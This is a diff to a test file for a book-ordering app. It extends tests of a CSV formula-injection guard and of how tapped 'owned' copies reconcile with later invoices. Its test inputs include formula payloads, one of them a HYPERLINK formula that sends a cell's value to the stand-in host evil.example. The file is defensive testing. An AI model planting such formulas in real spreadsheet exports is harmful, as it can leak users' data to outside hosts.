@@ -1,18 +1,21 @@
 // No-shop mode (philobiblos#27 slice 5): the month's order as a plain list (mail text, a printable page, a CSV) for any
 // shop or none, and its books marked owned by a tap (and the tap undone). Every book, name and number is invented. Each
 // rule has a test that fails when the rule is changed; the CSV's formula guard is philobiblos#45's.
-import { eq } from 'drizzle-orm';
+import { and, eq } from 'drizzle-orm';
 import { afterAll, beforeEach, describe, expect, it } from 'vitest';
 import { buildApp, type BuiltApp } from '../src/app';
 import { loadConfig } from '../src/config';
 import * as t from '../src/db/schema';
 import { seal } from '../src/household/sealed';
 import { parseCsv } from '../src/orders/csv';
+import { TAP_INVOICE_DAYS } from '../src/mail/effects';
 import { recordEntry } from '../src/orders/entries';
 import { LIST_COLUMNS, csvCell, listCsv, unguardCell } from '../src/orders/list';
 import { ORIGIN, TEST_SEALING_KEY, THIS_MONTH, household, sessionCookie } from './helpers';
 
-const HOSTILE = ['\u0007=1+1', '\tcmd', '\rcmd', '=HYPERLINK("https://evil.example/?x="&A1,"Open")', '+1+1', '-2+3', '@SUM(A1:A9)', '\t=1+1', '\r=1+1', '  =1+1', '＝1+1', '＋1', '－1', '＠SUM(A1)'];
+const HOSTILE = ['\u0007=1+1', '\tcmd', '\rcmd', '=HYPERLINK("https://evil.example/?x="&A1,"Open")', '+1+1', '-2+3', '@SUM(A1:A9)', '\t=1+1', '\r=1+1', '  =1+1', '＝1+1', '＋1', '－1', '＠SUM(A1)',
+  // philobiblos#47 item 3: an invisible character first, and the small and other compatibility forms of = + - @ (NFKC).
+  '\u200b=1+1', '\u2060@SUM(A1)', '\ufeff+1', '\u200d-1', '\u00a0=1', '﹢1', '﹦1', '﹣1', '﹫x', '⁺1', '₌1'];
 
 describe('the CSV formula guard (philobiblos#45; OWASP CSV injection)', () => {
   it.each(HOSTILE)('a cell starting %j is written as text (a leading quote), quoted', (v) => {
@@ -27,14 +30,19 @@ describe('the CSV formula guard (philobiblos#45; OWASP CSV injection)', () => {
   it('ordinary text is only quoted; a quote inside is written twice; one row stays one line', () => {
     expect(csvCell('The Quiet Hedgehog')).toBe('"The Quiet Hedgehog"');
     expect(csvCell('Value "Beyond" Price')).toBe('"Value ""Beyond"" Price"');
-    expect(csvCell('\'s-Hertogenbosch, a history')).toBe('"\'s-Hertogenbosch, a history"');
     expect(csvCell('Two\nlines\r\nhere')).toBe('"Two lines  here"');
     expect(csvCell('A - B = C')).toBe('"A - B = C"'); // a formula character later in the cell is text
     expect(csvCell('')).toBe('""');
   });
 
+  it('a cell that starts with an apostrophe gets one more, which the import leaves out (philobiblos#47 item 2)', () => {
+    expect(csvCell('\'s-Hertogenbosch, a history')).toBe('"\'\'s-Hertogenbosch, a history"');
+    expect(csvCell('\'=x')).toBe('"\'\'=x"');
+    for (const v of ['\'=x', '\' Tis the season', '\'s-Hertogenbosch', '\'', '\'\'twice', '\'\t=1']) expect(unguardCell(parseCsv(csvCell(v))[0]![0]!), JSON.stringify(v)).toBe(v.replace(/\t/g, ' '));
+  });
+
   it('the importer reads a guarded cell back as it was; any other apostrophe stays', () => {
-    for (const v of ['=1+1', '+1', '-2+3', '@SUM(A1)', '  =1']) expect(unguardCell(parseCsv(csvCell(v))[0]![0]!)).toBe(v);
+    for (const v of ['=1+1', '+1', '-2+3', '@SUM(A1)', '  =1', '\u200b=1', '﹢1', '\u00a0=1', '⁺1']) expect(unguardCell(parseCsv(csvCell(v))[0]![0]!), JSON.stringify(v)).toBe(v);
     expect(unguardCell('\'s-Hertogenbosch')).toBe('\'s-Hertogenbosch');
     expect(unguardCell('\'Tis the season')).toBe('\'Tis the season');
   });
@@ -96,7 +104,12 @@ const send = (method: 'POST' | 'PUT', url: string, payload: unknown, cookie = al
   built.app.inject({ method, url, payload: JSON.stringify(payload), headers: { cookie, origin: ORIGIN, 'content-type': 'application/json' } });
 const line = (bookId: string) => db.select().from(t.orderLine).where(eq(t.orderLine.bookId, bookId)).get()!;
 const copiesOf = (bookId: string) => db.select().from(t.copy).where(eq(t.copy.bookId, bookId)).all();
-const tap = (bookId: string, owned: unknown, cookie = alex) => send('PUT', `/api/orders/o_now/lines/${bookId}`, { owned }, cookie);
+/** A tap; the copy it made dated `iso`, the invoices' date here, so the tests do not depend on the day they run. */
+const tap = async (bookId: string, owned: unknown, cookie = alex) => {
+  const r = await send('PUT', `/api/orders/o_now/lines/${bookId}`, { owned }, cookie);
+  db.update(t.copy).set({ acquiredAt: iso }).where(eq(t.copy.source, 'manual')).run();
+  return r;
+};
 const makeList = async () => { const r = await send('POST', '/api/orders', { month: THIS_MONTH, list: true }); expect(r.statusCode, r.body).toBe(201); return r.json(); };
 
 describe('the order as a plain list (POST /orders, list: true)', () => {
@@ -212,6 +225,14 @@ describe('the list as a CSV (GET /orders/{id}/list.csv)', () => {
 });
 
 describe('a guarded cell imported (orders/entries.ts reads the guard back)', () => {
+  it('a title that starts with an apostrophe, exported and imported with no ISBN, keeps it (philobiblos#47 item 2)', () => {
+    const d = household();
+    const rows = ['\' Tis the Season of Quiet Things', '\'=Not a Formula', '\'s-Hertogenbosch Days'].map((title) => ({ title, authors: ['Lena Paulsen'], isbn13: null, estimateC: null }));
+    const csv = listCsv(rows).replaceAll(',"1","",""\r\n', ',"1","12.00",""\r\n');
+    const r = recordEntry(d, 'p_alex', { kind: 'invoice', shop: 'Corner Books', csv, dryRun: true }, new Date(iso));
+    expect(r.lines.map((l) => [l.new, l.title])).toEqual(rows.map((b) => [true, b.title]));
+  });
+
   it('a new book from a guarded cell keeps its own title, without the quote the guard wrote', () => {
     const d = household();
     const csv = `title,author,qty,price\r\n${csvCell('=Sums of the Commons')},${csvCell('-Ada Example')},1,9.00\r\n${csvCell('\'s-Hertogenbosch Days')},,1,9.00\r\n`;
@@ -261,6 +282,54 @@ describe('a copy marked owned by a tap (PUT /orders/{id}/lines/{bookId})', () =>
     expect((await tap('b_tide', true)).statusCode).toBe(409);
     expect((await tap('b_tide', false)).statusCode).toBe(409);
     expect(copiesOf('b_tide')).toHaveLength(1);
+    // A second invoice of the book is a second copy bought: of no order (the line was the first invoice's), the total as it was.
+    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', lines: [{ isbn: '9780000000002', price: 1400 }] }, new Date(iso));
+    expect(copiesOf('b_tide').map((c) => [c.orderId, c.priceC]).sort()).toEqual([['o_now', 1500], [null, 1400]].sort());
+    expect(db.select().from(t.order).where(eq(t.order.id, 'o_now')).get()!.invoicedC).toBe(1500);
+  });
+
+  it('a tap, then the invoice typed in: the invoice takes the tap\'s copy (one copy, its price paid), the order invoiced, no undo (philobiblos#47)', async () => {
+    await makeList();
+    expect((await tap('b_tide', true)).statusCode).toBe(200);
+    const tapped = line('b_tide').copyId!;
+    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', lines: [{ isbn: '9780000000002', price: 1500 }] }, new Date(iso));
+    expect(copiesOf('b_tide').map((c) => [c.id, c.source, c.orderId, c.priceC])).toEqual([[tapped, 'manual', 'o_now', 1500]]);
+    expect(line('b_tide')).toMatchObject({ state: 'delivered', copyId: null, tappedFrom: null });
+    expect(db.select().from(t.order).where(eq(t.order.id, 'o_now')).get()).toMatchObject({ status: 'invoiced', invoicedC: 1500 });
+    expect(db.select().from(t.bookOffer).where(eq(t.bookOffer.bookId, 'b_tide')).all().map((o) => o.priceC)).toEqual([1500]);
+    const r = await get('/api/orders/o_now');
+    expect(r.json().lines.find((l: { book: { id: string } }) => l.book.id === 'b_tide')).toMatchObject({ state: 'delivered', ownedByTap: false });
+    expect((await tap('b_tide', false)).statusCode).toBe(409); // the invoice's copy now: never undone here
+    expect(copiesOf('b_tide')).toHaveLength(1);
+  });
+
+  it('a tap, then an invoice of two copies: the tap\'s copy and one more, both at the price paid', async () => {
+    await makeList();
+    expect((await tap('b_tide', true)).statusCode).toBe(200);
+    const tapped = line('b_tide').copyId!;
+    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', lines: [{ isbn: '9780000000002', price: 1500, qty: 2 }] }, new Date(iso));
+    const copies = copiesOf('b_tide');
+    expect(copies.map((c) => [c.orderId, c.priceC])).toEqual([['o_now', 1500], ['o_now', 1500]]);
+    expect(copies.map((c) => c.id)).toContain(tapped);
+  });
+
+  it('a tap long before an invoice of the book is another purchase: the invoice makes its own copy, the tap stays (philobiblos#47)', async () => {
+    await makeList();
+    expect((await tap('b_tide', true)).statusCode).toBe(200);
+    const later = new Date(Date.parse(iso) + (TAP_INVOICE_DAYS + 1) * 86_400_000);
+    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', date: later.toISOString().slice(0, 10), lines: [{ isbn: '9780000000002', price: 1500 }] }, later);
+    expect(copiesOf('b_tide').map((c) => [c.source, c.orderId, c.priceC]).sort()).toEqual([['manual', null, 1500], ['manual', 'o_now', null]]);
+    expect(line('b_tide').copyId).not.toBeNull(); // still the tap's, still undoable
+  });
+
+  it('a book tapped in one order and still to buy in a later one: the invoice delivers the later line, the tap stays', async () => {
+    await makeList();
+    expect((await tap('b_tide', true)).statusCode).toBe(200);
+    db.insert(t.order).values({ id: 'o_next', month: '2099-01', status: 'drafted', createdAt: iso }).run();
+    db.insert(t.orderLine).values({ orderId: 'o_next', bookId: 'b_tide', forPerson: 'p_sam', estimateC: 1890 }).run();
+    recordEntry(db, 'p_alex', { kind: 'invoice', shop: 'Corner Books', lines: [{ isbn: '9780000000002', price: 1500 }] }, new Date(iso));
+    expect(copiesOf('b_tide').map((c) => c.orderId).sort()).toEqual(['o_next', 'o_now']);
+    expect(db.select().from(t.orderLine).where(and(eq(t.orderLine.orderId, 'o_now'), eq(t.orderLine.bookId, 'b_tide'))).get()!.copyId).not.toBeNull();
   });
 
   it('a quote after a tap leaves the bought line as it is (delivered, still undoable)', async () => {
